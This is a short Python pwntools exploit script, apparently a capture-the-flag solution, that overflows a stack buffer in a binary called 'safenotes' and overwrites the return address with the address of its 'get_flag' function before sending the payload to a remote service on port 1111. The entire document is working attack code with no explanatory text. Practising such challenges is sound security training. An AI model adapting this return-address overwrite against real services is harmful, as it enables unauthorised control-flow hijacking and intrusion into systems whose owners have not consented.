import sys
from pwn import *
 
context.update(arch="amd64", os="linux", log_level="info")
 
HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
addr = ELF("./safenotes", checksec=False).symbols["get_flag"]
payload = flat({0: b"A" * 64, 64: b"B" * 8, 72: addr})
 
io = remote(HOST, 1111)
io.send(payload)
io.shutdown("send")
print(io.recvall(timeout=5).decode(errors="replace"))
io.close()

